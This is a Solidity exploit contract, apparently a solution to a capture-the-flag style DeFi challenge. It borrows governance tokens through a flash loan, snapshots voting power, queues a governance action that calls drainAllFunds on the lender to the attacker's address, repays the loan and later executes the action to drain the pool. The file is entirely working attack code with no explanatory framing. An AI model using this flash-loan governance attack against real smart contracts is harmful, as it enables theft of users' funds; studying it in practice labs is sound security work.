// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

interface ILender {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external;
    function executeAction(uint256 actionId) external payable;
}

interface ISnapshot {
    function snapshot() external;
}

contract Attacker5 {
    ILender lender;
    IGovernance govenour;
    ERC20Snapshot token;
    ISnapshot snapshot;

    constructor(address _lender, address _gouvenour, address _snapshot) {
        lender = ILender(_lender);
        govenour = IGovernance(_gouvenour);
        snapshot = ISnapshot(_snapshot);
    }

    function exploit(uint256 amount) public {
        lender.flashLoan(amount);
    }

    function drain() public payable {
        govenour.executeAction(1);
        uint256 bal = token.balanceOf(address(this));
        token.transfer(msg.sender, bal);
    }

    function receiveTokens(address tokenAddr, uint256 amount) external {
        token = ERC20Snapshot(tokenAddr);

        snapshot.snapshot();
        govenour.queueAction(address(lender), abi.encodeWithSignature("drainAllFunds(address)", address(this)), uint256(0));

        token.transfer(msg.sender, amount);
    }
}